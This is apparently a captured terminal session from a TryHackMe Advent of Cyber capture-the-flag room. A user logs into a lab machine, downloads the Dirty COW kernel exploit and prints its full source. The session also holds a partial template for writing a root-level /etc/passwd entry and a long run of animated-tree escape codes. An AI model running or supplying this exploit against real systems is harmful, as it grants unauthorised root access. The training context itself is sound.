@@ -1,0 +1,2348 @@
+Trying 10.10.148.69...
+Connected to 10.10.148.69.
+Escape character is '^]'.
+HI SANTA!!! 
+
+We knew you were coming and we wanted to make
+it easy to drop off presents, so we created
+an account for you to use.
+
+Username: santa
+Password: clauschristmas
+
+We left you cookies and milk!
+
+christmas login: santa
+Password: 
+Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2
+                \ / 
+              -->*<-- 
+                /o\ 
+               /_\_\ 
+              /_/_0_\ 
+             /_o_\_\_\ 
+            /_/_/_/_/o\ 
+           /@\_\_\@\_\_\ 
+          /_/_/O/_/_/_/_\ 
+         /_\_\_\_\_\o\_\_\ 
+        /_/0/_/_/_0_/_/@/_\ 
+       /_\_\_\_\_\_\_\_\_\_\ 
+      /_/o/_/_/@/_/_/o/_/0/_\ 
+               [___] 
+   
+$ ls
+christmas.sh  cookies_and_milk.txt
+$ pwd
+/home/santa
+$ clear
+[H[2J$ cat /et	^H^H^H^H
+cat: /et: No such file or directory
+cat: : No such file or directory
+$ cat /etc/*release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=12.04
+DISTRIB_CODENAME=precise
+DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
+$ cat /etc/issue
+HI SANTA!!! 
+
+We knew you were coming and we wanted to make
+it easy to drop off presents, so we created
+an account for you to use.
+
+Username: santa
+Password: clauschristmas
+
+We left you cookies and milk!
+
+$ clear
+[H[2J$ ls
+christmas.sh  cookies_and_milk.txt
+$ cat cookies_and_milk.txt
+/*************************************************
+// HAHA! Too bad Santa! I, the Grinch, got here 
+// before you did! I helped myself to some of
+// the goodies here, but you can still enjoy
+// some half eaten cookies and this leftover
+// milk! Why dont you try and refill it yourself!
+//   - Yours Truly,
+//         The Grinch
+//*************************************************/
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
+
+const char *filename = "/etc/passwd";
+const char *backup_filename = "/tmp/passwd.bak";
+const char *salt = "grinch";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+};
+
+char *generate_password_hash(char *plaintext_pw) {
+  return crypt(plaintext_pw, salt);
+}
+
+char *generate_passwd_line(struct Userinfo u) {
+  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
+  int size = snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret = malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+}
+
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+
+int copy_file(const char *from, const char *to) {
+  // check if target file already exists
+  if(access(to, F_OK) != -1) {
+    printf("File %s already exists! Please delete it and run again\n",
+      to);
+    return -1;
+  }
+
+  char ch;
+  FILE *source, *target;
+
+  source = fopen(from, "r");
+  if(source == NULL) {
+    return -1;
+  }
+  target = fopen(to, "w");
+  if(target == NULL) {
+     fclose(source);
+     return -1;
+  }
+
+  while((ch = fgetc(source)) != EOF) {
+     fputc(ch, target);
+   }
+
+  printf("%s successfully backed up to %s\n",
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+}
+
+int main(int argc, char *argv[])
+{
+  // backup file
+  int ret = copy_file(filename, backup_filename);
+  if (ret != 0) {
+    exit(ret);
+  }
+
+  struct Userinfo user;
+  // set values, change as needed
+  user.username = "grinch";
+  user.user_id = 0;
+  user.group_id = 0;
+  user.info = "pwned";
+  user.home_dir = "/root";
+  user.shell = "/bin/bash";
+
+}
+
+/*************************************************
+// HAHA! Too bad Santa! I, the Grinch, got here 
+// before you did! I helped myself to some of
+// the goodies here, but you can still enjoy
+// some half eaten cookies and this leftover
+// milk! Why dont you try and refill it yourself!
+//   - Yours Truly,
+//         The Grinch
+//*************************************************/
+$ clear
+[H[2J$ uname -a
+Linux christmas 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+$ id
+uid=1001(santa) gid=1003(santa) groups=1003(santa)
+$ whoami
+santa
+$ cat /etc/suo^H^H^[^H        o  doer
+cat: /etc/sudoer: No such file or directory
+$ ^[[A^[[1;5A^[[1;5A                  ct^Ha     ca	t     nc -lp 12345 > dirtyCow,^H.c     .c
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ nc -l -p 1234 > dirtycow.c
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ clear
+[H[2J$ nc help^H^H^H          --help
+nc: invalid option -- '-'
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ nc -l -p 4444 >dirty.c^[[D^[[D^[[D            ^[[1;5D        c
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ netcat
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ netcat -lp 4444 > dirty.c
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ clear
+[H[2J$ wget^H^H^H^H^H^H^H^H^H^H^H                          nc -lp 4444 > /tmp/dirty.c
+This is nc from the netcat-openbsd package. An alternative nc is available
+in the netcat-traditional package.
+usage: nc [-46DdhklnrStUuvzC] [-i interval] [-P proxy_username] [-p source_port]
+	  [-s source_ip_address] [-T ToS] [-w timeout] [-X proxy_protocol]
+	  [-x proxy_address[:port]] [hostname] [port[s]]
+$ clear
+[H[2J$ wget http://10.9.69.3:8080/dirty_cow.c
+--2020-12-16 09:26:02--  http://10.9.69.3:8080/dirty_cow.c
+Connecting to 10.9.69.3:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2825 (2.8K) [text/plain]
+Saving to: `dirty_cow.c'
+
+ 0% [                                                    ] 0           --.-K/s              100%[===================================================>] 2,825       --.-K/s   in 0.01s   
+
+2020-12-16 09:26:03 (192 KB/s) - `dirty_cow.c' saved [2825/2825]
+
+$ ls
+christmas.sh  cookies_and_milk.txt  dirty.c  dirty_cow.c  dirtycow.c  dirtyCow.c
+$ rm di	^H       cat dirtycow.c
+$ rm dirtycow.c
+$ clear
+ls
+[H[2J$ christmas.sh  cookies_and_milk.txt  dirty.c  dirty_cow.c  dirtyCow.c
+$ cat dirty.c
+$ rm dirty.c
+$ ls
+christmas.sh  cookies_and_milk.txt  dirty_cow.c  dirtyCow.c
+$ a^H^H     cat dirtyCow.c
+$ rm dr^Hi    irtyCow.c
+$ clear
+ls[H[2J$ ls
+-sh: 37: lsls: not found
+$ ls
+christmas.sh  cookies_and_milk.txt  dirty_cow.c
+$ cat dirty_cow.c
+/*
+####################### dirtyc0w.c #######################
+$ sudo -s
+# echo this is not a test > foo
+# chmod 0404 foo
+$ ls -lah foo
+-r-----r-- 1 root root 19 Oct 20 15:23 foo
+$ cat foo
+this is not a test
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
+$ ./dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat foo
+m00000000000000000
+####################### dirtyc0w.c #######################
+*/
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdint.h>
+
+void *map;
+int f;
+struct stat st;
+char *name;
+ 
+void *madviseThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int i,c=0;
+  for(i=0;i<100000000;i++)
+  {
+/*
+You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
+> This is achieved by racing the madvise(MADV_DONTNEED) system call
+> while having the page of the executable mmapped in memory.
+*/
+    c+=madvise(map,100,MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n",c);
+}
+ 
+void *procselfmemThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+/*
+You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+>  The in the wild exploit we are aware of doesn't work on Red Hat
+>  Enterprise Linux 5 and 6 out of the box because on one side of
+>  the race it writes to /proc/self/mem, but /proc/self/mem is not
+>  writable on Red Hat Enterprise Linux 5 and 6.
+*/
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i<100000000;i++) {
+/*
+You have to reset the file pointer to the memory position.
+*/
+    lseek(f,(uintptr_t) map,SEEK_SET);
+    c+=write(f,str,strlen(str));
+  }
+  printf("procselfmem %d\n\n", c);
+}
+ 
+ 
+int main(int argc,char *argv[])
+{
+/*
+You have to pass two arguments. File and Contents.
+*/
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
+  pthread_t pth1,pth2;
+/*
+You have to open the file in read only mode.
+*/
+  f=open(argv[1],O_RDONLY);
+  fstat(f,&st);
+  name=argv[1];
+/*
+You have to use MAP_PRIVATE for copy-on-write mapping.
+> Create a private copy-on-write mapping.  Updates to the
+> mapping are not visible to other processes mapping the same
+> file, and are not carried through to the underlying file.  It
+> is unspecified whether changes made to the file after the
+> mmap() call are visible in the mapped region.
+*/
+/*
+You have to open with PROT_READ.
+*/
+  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+  printf("mmap %zx\n\n",(uintptr_t) map);
+/*
+You have to do it on two threads.
+*/
+  pthread_create(&pth1,NULL,madviseThread,argv[1]);
+  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+/*
+You have to wait for the threads to finish.
+*/
+  pthread_join(pth1,NULL);
+  pthread_join(pth2,NULL);
+  return 0;
+}$ clear
+[H[2J$ ls
+christmas.sh  cookies_and_milk.txt  dirty_cow.c
+$ ls
+christmas.sh  cookies_and_milk.txt  dirty_cow.c
+$ mv dirty_cow.c dirty_^H   .c
+$ clear
+[H[2J$ ls
+christmas.sh  cookies_and_milk.txt  dirty.c
+$ cat cookies_and_milk.txt
+/*************************************************
+// HAHA! Too bad Santa! I, the Grinch, got here 
+// before you did! I helped myself to some of
+// the goodies here, but you can still enjoy
+// some half eaten cookies and this leftover
+// milk! Why dont you try and refill it yourself!
+//   - Yours Truly,
+//         The Grinch
+//*************************************************/
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
+
+const char *filename = "/etc/passwd";
+const char *backup_filename = "/tmp/passwd.bak";
+const char *salt = "grinch";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+};
+
+char *generate_password_hash(char *plaintext_pw) {
+  return crypt(plaintext_pw, salt);
+}
+
+char *generate_passwd_line(struct Userinfo u) {
+  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
+  int size = snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret = malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+}
+
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+
+int copy_file(const char *from, const char *to) {
+  // check if target file already exists
+  if(access(to, F_OK) != -1) {
+    printf("File %s already exists! Please delete it and run again\n",
+      to);
+    return -1;
+  }
+
+  char ch;
+  FILE *source, *target;
+
+  source = fopen(from, "r");
+  if(source == NULL) {
+    return -1;
+  }
+  target = fopen(to, "w");
+  if(target == NULL) {
+     fclose(source);
+     return -1;
+  }
+
+  while((ch = fgetc(source)) != EOF) {
+     fputc(ch, target);
+   }
+
+  printf("%s successfully backed up to %s\n",
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+}
+
+int main(int argc, char *argv[])
+{
+  // backup file
+  int ret = copy_file(filename, backup_filename);
+  if (ret != 0) {
+    exit(ret);
+  }
+
+  struct Userinfo user;
+  // set values, change as needed
+  user.username = "grinch";
+  user.user_id = 0;
+  user.group_id = 0;
+  user.info = "pwned";
+  user.home_dir = "/root";
+  user.shell = "/bin/bash";
+
+}
+
+/*************************************************
+// HAHA! Too bad Santa! I, the Grinch, got here 
+// before you did! I helped myself to some of
+// the goodies here, but you can still enjoy
+// some half eaten cookies and this leftover
+// milk! Why dont you try and refill it yourself!
+//   - Yours Truly,
+//         The Grinch
+//*************************************************/
+$ clear
+[H[2J$ sl  ls
+christmas.sh  cookies_and_milk.txt  dirty.c
+$ ./christmas.sh
+[H[2J[?25l[32m[1m[3;47H*[4;46H***[5;45H*****[6;44H*******[7;43H*********[8;42H***********[9;41H*************[10;40H***************[11;39H*****************[12;38H*******************(B[m[33m[13;46HmWm
+[14;46HmWm
+[31m[1m[15;40H  TryHackMe
+[16;36H  Advent of Cyber with John Hammond
+[30m[1m[10;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[7;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[11;40Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[12;39Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[8;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[11;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;39Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[9;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[7;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[10;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[10;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[9;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[11;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[8;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[12;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[7;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[12;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[7;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[11;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[6;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[10;51H*
+[33m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;51H*
+[34m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;42H*
+[35m[1m[12;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;46H*
+[36m[1m[12;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;40H*
+[37m[1m[8;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;39H*
+[30m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[31m[1m[11;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;43H*
+[32m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;48H*
+[33m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;46H*
+[34m[1m[10;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;39H*
+[35m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;50H*
+[36m[1m[10;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;46H*
+[37m[1m[8;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;51H*
+[30m[1m[10;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;48H*
+[31m[1m[9;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[10;47H*
+[32m[1m[8;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[10;49H*
+[33m[1m[9;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[34m[1m[11;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44H*
+[35m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;46H*
+[36m[1m[10;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[37m[1m[9;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;50H*
+[30m[1m[6;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;45H*
+[31m[1m[7;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;42H*
+[32m[1m[12;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;41H*
+[33m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44H*
+[34m[1m[10;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[35m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;50H*
+[36m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;41H*
+[37m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;48H*
+[30m[1m[12;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;46H*
+[31m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44H*
+[32m[1m[6;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[7;44H*
+[33m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;49H*
+[34m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[35m[1m[6;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[9;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[8;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[9;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[9;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[12;39Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[6;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[6;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[9;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;42Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[9;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[6;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[9;52Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[12;45Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[12;53Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[7;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[7;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[9;44Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[31m[1m[5;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[33m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[34m[1m[11;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[35m[1m[6;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[36m[1m[7;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[37m[1m[7;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[30m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;50H*
+[31m[1m[7;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;46H*
+[32m[1m[7;46Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[8;47H*
+[33m[1m[8;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;48H*
+[34m[1m[5;48Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;45H*
+[35m[1m[12;43Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;50H*
+[36m[1m[7;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[12;39H*
+[37m[1m[10;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;45H*
+[30m[1m[10;41Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;45H*
+[31m[1m[12;51Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[6;49H*
+[32m[1m[9;50Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[9;46H*
+[33m[1m[4;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[4;47H*
+[34m[1m[10;49Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[11;42H*
+[35m[1m[8;47Ho
+[16;48HC
+[16;49Hy
+[16;50Hb
+[16;51He
+[16;52Hr
+[32m[1m[5;48H*
+[36m[1m[5;48Ho
